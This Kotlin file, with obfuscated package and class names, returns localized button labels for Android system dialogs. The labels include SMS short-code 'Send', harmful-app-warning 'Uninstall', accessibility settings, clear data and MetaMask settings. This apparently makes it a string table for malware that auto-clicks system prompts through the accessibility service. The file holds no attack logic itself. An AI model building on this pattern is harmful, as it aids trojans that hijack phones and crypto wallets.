package com.xxx.zzz.accessppp

import org.json.JSONObject
import java.util.*

object Stringsqw {

    fun accept(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.accept)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Accept"
        }
    }

    fun metamask_settings(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.metamask_settings)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Settings"
        }
    }

    fun alert_windows_notification_turn_off_action(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.alert_windows_notification_turn_off_action)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Turn off"
        }
    }

    fun allow(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.allow)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Allow"
        }
    }

    fun app_info_clear_cache(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.app_info_clear_cache)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Clear cache"
        }
    }

    fun app_info_storage(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.app_info_storage)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Storage"
        }
    }

    fun app_info_storage2(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.app_info_storage2)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Storage"
        }
    }

    fun cancel(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.cancel)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Cancel"
        }
    }

    fun cancel2(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.cancel2)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Cancel"
        }
    }

    fun clear(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.clear)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Clear"
        }
    }

    fun clear_(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.clear_)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "clear"
        }
    }

    fun clear_data(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.clear_data)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Clear data"
        }
    }

    fun clear_data2(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.clear_data2)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Clear data"
        }
    }

    fun exo_controls_pause_description(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.exo_controls_pause_description)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Pause"
        }
    }

    fun global_action_settings(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.global_action_settings)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Settings"
        }
    }

    fun gpsVerifYes(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.gpsVerifYes)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Yes"
        }
    }

    fun harmful_app_warning_uninstall(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.harmful_app_warning_uninstall)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Uninstall"
        }
    }

    fun harmful_app_warning_uninstall2(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.harmful_app_warning_uninstall2)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Uninstall"
        }
    }

    fun localeTextAccessibility(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.l3)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Enable"
        }
    }

    fun lockscreen_transport_pause_description(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.lockscreen_transport_pause_description)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Pause"
        }
    }

    fun menu_setting(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.menu_setting)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Setting"
        }
    }

    fun notification_app_name_settings(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.notification_app_name_settings)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Settings"
        }
    }

    fun ok(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.ok)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "OK"
        }
    }

    fun reset(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.reset)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Reset"
        }
    }

    fun sms_short_code_confirm_allow(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.sms_short_code_confirm_allow)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Send"
        }
    }

    fun spec_settings(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.spec_settings)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Accessibility settings"
        }
    }

    fun spec_settings2(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.spec_settings2)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Accessibility"
        }
    }

    fun storage_title(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.storage_title)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Storage"
        }
    }

    fun uninstall_selected_apps(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.uninstall_selected_apps)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Clear All"
        }
    }

    fun wait(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.wait)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Wait"
        }
    }

    fun yes(): String? {
        return try {
            val jsonObject = JSONObject(cosdfnstNm.yes)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Yes"
        }
    }

}